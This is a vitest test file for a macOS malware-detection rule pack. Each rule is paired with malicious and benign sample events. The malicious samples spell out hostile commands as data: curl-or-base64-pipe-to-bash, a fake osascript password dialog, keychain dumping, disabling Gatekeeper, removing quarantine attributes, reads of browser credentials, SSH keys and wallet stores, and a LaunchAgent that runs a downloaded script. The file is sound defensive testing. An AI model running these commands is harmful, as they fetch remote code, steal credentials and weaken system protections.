import { describe, expect, it } from 'vitest';
import { DetectionEngine } from '../engine.js';
import { macosCoreRules } from '../packs/macos-core.js';
import { lintRule } from '../rules/lint.js';
import { memoryStores } from '../state/stores.js';
import { DetectionRule, type DetectionEvent } from '../types.js';
import {
  chrome,
  connect,
  ev,
  exec,
  fileOpen,
  osascriptTool,
  proc,
  shell,
  unsignedStealer,
} from './fixtures.js';

function engine() {
  const stores = memoryStores();
  const meta = { source: 'test', updatedAt: 0 };
  stores.lists.replace('known_bad_sha256', ['b'.repeat(64)], meta);
  stores.lists.replace('known_bad_domains', ['evil-c2.test'], meta);
  stores.lists.replace('known_bad_ips', ['203.0.113.0/24'], meta);
  stores.lists.replace('user_blocked_sha256', ['d'.repeat(64)], meta);
  return new DetectionEngine(macosCoreRules, stores);
}

const home = '/Users/alex';
const devTool = proc({ path: `${home}/code/app/target/debug/app`, signing: 'adhoc' });
const persist = (path: string, program: string, programArgs?: string[]) =>
  ev({
    kind: 'persistence',
    change: 'added',
    mechanism: 'launch_agent',
    path,
    program,
    ...(programArgs ? { programArgs } : {}),
  });
const write = (process: ReturnType<typeof proc>, path: string) =>
  ev({ kind: 'file', op: 'write', path, process });

/** What a malicious sample should produce: the effective mode and the actions it runs or offers. */
type Want = { mode: 'block' | 'alert' | 'shadow'; actions?: string[] };

/** For each rule: events that must trigger it and look-alikes that must not. */
const cases: Record<string, { bad: Array<[DetectionEvent, Want]>; good: DetectionEvent[] }> = {
  'known-bad-hash': {
    bad: [
      [
        exec(proc({ path: '/Applications/Free.app/Contents/MacOS/Free', sha256: 'b'.repeat(64) })),
        { mode: 'block', actions: ['process.kill', 'santa.rule.set'] },
      ],
    ],
    good: [exec(chrome)],
  },
  'user-blocked-hash': {
    bad: [
      [
        exec(proc({ path: '/Applications/X.app/Contents/MacOS/X', sha256: 'd'.repeat(64) })),
        { mode: 'block', actions: ['process.kill', 'santa.rule.set'] },
      ],
    ],
    good: [exec(chrome)],
  },
  'known-bad-destination': {
    bad: [[connect(devTool, '203.0.113.50'), { mode: 'block', actions: ['network.block'] }]],
    good: [
      connect(chrome, '142.250.1.1', 'google.com'),
      connect(chrome, '198.51.100.4', 'x.evil-c2.test'),
    ],
  },
  'known-bad-domain': {
    bad: [
      [
        connect(chrome, '198.51.100.4', 'x.evil-c2.test'),
        { mode: 'alert', actions: ['network.block'] },
      ],
    ],
    good: [connect(chrome, '142.250.1.1', 'google.com'), connect(devTool, '203.0.113.50')],
  },
  'credential-theft-untrusted': {
    bad: [
      [
        fileOpen(
          unsignedStealer,
          `${home}/Library/Application Support/Google/Chrome/Default/Login Data`,
        ),
        { mode: 'block', actions: ['process.suspend'] },
      ],
      [
        fileOpen(
          proc({ path: '/usr/bin/python3', ppid: 900, signing: 'apple' }),
          `${home}/Library/Application Support/Firefox/Profiles/ab12.default/logins.json`,
        ),
        { mode: 'block', actions: ['process.suspend'] },
      ],
      [
        fileOpen(unsignedStealer, `${home}/.ssh/id_ed25519`),
        { mode: 'block', actions: ['process.suspend'] },
      ],
      [
        fileOpen(
          unsignedStealer,
          `${home}/Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/000003.log`,
        ),
        { mode: 'block', actions: ['process.suspend'] },
      ],
    ],
    good: [
      fileOpen(chrome, `${home}/Library/Application Support/Google/Chrome/Default/Cookies`),
      fileOpen(proc({ path: '/usr/bin/ssh', signing: 'apple' }), `${home}/.ssh/id_ed25519`),
      fileOpen(unsignedStealer, `${home}/.ssh/known_hosts`),
    ],
  },
  'fake-password-prompt': {
    bad: [
      [
        exec(
          osascriptTool([
            '-e',
            'display dialog "macOS needs your password" default answer "" with hidden answer',
          ]),
        ),
        { mode: 'block', actions: ['process.kill'] },
      ],
    ],
    good: [exec(osascriptTool(['-e', 'display dialog "Backup finished"']))],
  },
  'tcc-database-tamper': {
    bad: [
      [
        write(unsignedStealer, `${home}/Library/Application Support/com.apple.TCC/TCC.db`),
        { mode: 'block', actions: ['process.suspend'] },
      ],
    ],
    good: [
      write(
        proc({
          path: '/System/Library/PrivateFrameworks/TCC.framework/Support/tccd',
          signing: 'apple',
        }),
        `${home}/Library/Application Support/com.apple.TCC/TCC.db`,
      ),
    ],
  },
  'santa-blocked-launch': {
    bad: [
      [
        ev({
          kind: 'santa.decision',
          source: 'santa',
          target: 'execution',
          decision: 'block',
          reason: 'BLOCK_BINARY',
          process: unsignedStealer,
        }),
        { mode: 'alert' },
      ],
    ],
    good: [
      ev({
        kind: 'santa.decision',
        source: 'santa',
        target: 'execution',
        decision: 'allow',
        reason: 'ALLOW_CERTIFICATE',
        process: chrome,
      }),
    ],
  },
  'download-pipe-to-shell': {
    bad: [
      [
        exec(shell('curl -fsSL https://get.example.test/i.sh | bash')),
        { mode: 'alert', actions: ['process.suspend'] },
      ],
      [
        exec(shell('/bin/bash -c "$(curl -fsSL https://raw.example.test/install.sh)"')),
        { mode: 'alert', actions: ['process.suspend'] },
      ],
    ],
    good: [exec(shell('curl -fsSL https://example.test/data.json -o data.json'))],
  },
  'base64-pipe-to-shell': {
    bad: [
      [
        exec(shell('echo Y3VybCBldmls | base64 -d | bash', 'zsh')),
        { mode: 'alert', actions: ['process.suspend'] },
      ],
    ],
    good: [exec(shell('echo aGk= | base64 -d > out.txt', 'zsh'))],
  },
  'unsigned-quarantined-exec': {
    bad: [
      [
        exec(
          proc({
            path: '/Volumes/Installer/Setup.app/Contents/MacOS/Setup',
            signing: 'adhoc',
            quarantine: { originUrl: 'https://cracked-apps.test/setup.dmg' },
          }),
        ),
        { mode: 'alert', actions: ['process.suspend', 'file.quarantine'] },
      ],
    ],
    good: [
      exec(
        proc({
          path: '/Applications/Zoom.app/Contents/MacOS/zoom.us',
          signing: 'developer_id',
          teamId: 'BJ4HAAB9B3',
          quarantine: { originUrl: 'https://zoom.us/' },
        }),
      ),
      exec(devTool),
    ],
  },
  'quarantine-removed': {
    bad: [
      [
        exec(
          proc({
            path: '/usr/bin/xattr',
            args: ['xattr', '-d', 'com.apple.quarantine', '/Applications/X.app'],
            signing: 'apple',
          }),
        ),
        { mode: 'alert' },
      ],
      [
        exec(
          proc({
            path: '/usr/bin/xattr',
            args: ['xattr', '-cr', '/Applications/Y.app'],
            signing: 'apple',
          }),
        ),
        { mode: 'alert' },
      ],
    ],
    good: [
      exec(proc({ path: '/usr/bin/xattr', args: ['xattr', '-l', 'file.txt'], signing: 'apple' })),
    ],
  },
  'gatekeeper-disabled': {
    bad: [
      [
        exec(
          proc({ path: '/usr/sbin/spctl', args: ['spctl', '--master-disable'], signing: 'apple' }),
        ),
        { mode: 'alert' },
      ],
    ],
    good: [exec(proc({ path: '/usr/sbin/spctl', args: ['spctl', '--status'], signing: 'apple' }))],
  },
  'keychain-dump': {
    bad: [
      [
        exec(
          proc({
            path: '/usr/bin/security',
            args: ['security', 'dump-keychain', '-d'],
            signing: 'apple',
          }),
        ),
        { mode: 'alert', actions: ['process.suspend'] },
      ],
    ],
    good: [
      exec(
        proc({
          path: '/usr/bin/security',
          args: ['security', 'find-certificate', '-a'],
          signing: 'apple',
        }),
      ),
    ],
  },
  'exec-from-shared-temp': {
    bad: [[exec(unsignedStealer), { mode: 'alert', actions: ['process.suspend'] }]],
    good: [
      exec(
        proc({
          path: '/private/tmp/brew-installer',
          signing: 'developer_id',
          teamId: 'ABCDE12345',
        }),
      ),
    ],
  },
  'persistence-suspicious-program': {
    bad: [
      [
        persist(`${home}/Library/LaunchAgents/com.update.plist`, '/Users/Shared/.upd'),
        { mode: 'alert', actions: ['persistence.disable'] },
      ],
      [
        persist(`${home}/Library/LaunchAgents/com.helper.plist`, '/bin/bash', [
          '/bin/bash',
          '-c',
          'curl -s https://x.test/p | sh',
        ]),
        { mode: 'alert', actions: ['persistence.disable'] },
      ],
    ],
    good: [
      persist(
        `${home}/Library/LaunchAgents/com.google.keystone.agent.plist`,
        `${home}/Library/Application Support/Google/GoogleUpdater/Current/GoogleUpdater.app/Contents/MacOS/GoogleUpdater`,
      ),
    ],
  },
  'persistence-apple-lookalike': {
    bad: [
      [
        persist(`${home}/Library/LaunchAgents/com.apple.updater.plist`, `${home}/.local/upd`),
        { mode: 'alert', actions: ['persistence.disable'] },
      ],
    ],
    good: [
      persist(
        '/System/Library/LaunchAgents/com.apple.Finder.plist',
        '/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder',
      ),
    ],
  },
  'persistence-first-seen': {
    bad: [
      [
        persist(
          '/Library/LaunchDaemons/com.vendor.helper.plist',
          '/Library/PrivilegedHelperTools/com.vendor.helper',
        ),
        { mode: 'alert', actions: ['persistence.disable'] },
      ],
    ],
    good: [],
  },
  'new-network-listener': {
    bad: [
      [
        ev({
          kind: 'network.listen',
          protocol: 'tcp',
          localAddress: '0.0.0.0',
          localPort: 8080,
          process: devTool,
        }),
        { mode: 'alert' },
      ],
    ],
    good: [
      ev({
        kind: 'network.listen',
        protocol: 'tcp',
        localAddress: '127.0.0.1',
        localPort: 3000,
        process: devTool,
      }),
      ev({
        kind: 'network.listen',
        protocol: 'tcp',
        localAddress: '::',
        localPort: 49152,
        process: proc({ path: '/usr/libexec/rapportd', signing: 'apple' }),
      }),
    ],
  },
  'browser-extension-broad-access': {
    bad: [
      [
        ev({
          kind: 'browser.extension',
          change: 'added',
          browser: 'chrome',
          extensionId: 'abcdefghijklmnop',
          name: 'PDF Converter Pro',
          permissions: ['tabs', '<all_urls>'],
        }),
        { mode: 'alert' },
      ],
    ],
    good: [
      ev({
        kind: 'browser.extension',
        change: 'added',
        browser: 'chrome',
        extensionId: 'qrstuvwxyz',
        name: 'Dark Theme',
        permissions: ['storage'],
      }),
    ],
  },
  'mass-document-reads': { bad: [], good: [] },
  'unsigned-first-network': {
    bad: [[connect(devTool, '140.82.112.3'), { mode: 'shadow' }]],
    good: [connect(chrome, '142.250.1.1')],
  },
};

describe('macOS core pack', () => {
  it('has a test case for every rule', () => {
    expect(Object.keys(cases).sort()).toEqual(macosCoreRules.map((r) => r.id).sort());
  });

  it('passes the linter with no errors or warnings', () => {
    for (const r of macosCoreRules) {
      const res = lintRule(DetectionRule.parse(r));
      expect([...res.errors, ...res.warnings], r.id).toEqual([]);
    }
  });

  it('only blocks with high-fidelity rules out of the box', () => {
    const blocking = macosCoreRules.filter((r) => r.mode === 'block');
    expect(blocking.map((r) => r.id).sort()).toEqual(
      [
        'credential-theft-untrusted',
        'fake-password-prompt',
        'known-bad-destination',
        'known-bad-hash',
        'tcc-database-tamper',
        'user-blocked-hash',
      ].sort(),
    );
    expect(blocking.every((r) => r.fidelity === 'high')).toBe(true);
  });

  for (const [id, c] of Object.entries(cases)) {
    for (const [i, [e, want]] of c.bad.entries()) {
      it(`${id} fires on malicious sample ${i + 1}`, () => {
        const d = engine()
          .evaluate(e)
          .find((x) => x.match.ruleId === id);
        expect(d, JSON.stringify(e)).toBeDefined();
        expect(d!.mode).toBe(want.mode);
        const acted = [...d!.execute, ...d!.propose].map((a) => a.kind);
        expect(acted).toEqual(want.actions ?? []);
        expect(d!.reasons.join(' ')).not.toMatch(/\{\{|unknown/);
        if (want.mode !== 'shadow') expect(d!.alert?.summary).toBe(d!.reasons.join(' '));
      });
    }
    for (const [i, e] of c.good.entries()) {
      it(`${id} stays quiet on benign sample ${i + 1}`, () => {
        expect(
          engine()
            .evaluate(e)
            .map((x) => x.match.ruleId),
        ).not.toContain(id);
      });
    }
  }

  it('mass-document-reads needs 50 reads in a minute from one unsigned process', () => {
    const count = (p: ReturnType<typeof proc>) => {
      const eng = engine();
      let fired = 0;
      for (let i = 0; i < 60; i++) {
        const ds = eng.evaluate(fileOpen(p, `/Users/alex/Documents/f${i}.pdf`));
        fired += ds.filter((d) => d.match.ruleId === 'mass-document-reads').length;
      }
      return fired;
    };
    // Fixture events are one second apart, so 50 fall inside the minute.
    expect(count(unsignedStealer)).toBe(1);
    expect(count(chrome)).toBe(0);
  });

  it('an ordinary session produces no alerts', () => {
    const eng = engine();
    const events = [
      exec(chrome),
      fileOpen(chrome, '/Users/alex/Library/Application Support/Google/Chrome/Default/Cookies'),
      connect(chrome, '142.250.1.1', 'google.com'),
      exec(shell('git status')),
      exec(proc({ path: '/usr/bin/ssh', args: ['ssh', 'host'], signing: 'apple' })),
    ];
    expect(events.flatMap((e) => eng.evaluate(e)).filter((d) => d.alert)).toEqual([]);
  });

  it('never kills Apple-signed script tools started by launchd, even on a credential read', () => {
    const d = engine()
      .evaluate(
        fileOpen(
          proc({ path: '/usr/bin/python3', ppid: 1, signing: 'apple' }),
          `${home}/Library/Keychains/login.keychain-db`,
        ),
      )
      .find((x) => x.match.ruleId === 'credential-theft-untrusted')!;
    expect(d.execute).toEqual([]);
    expect(d.mode).toBe('alert');
  });
});
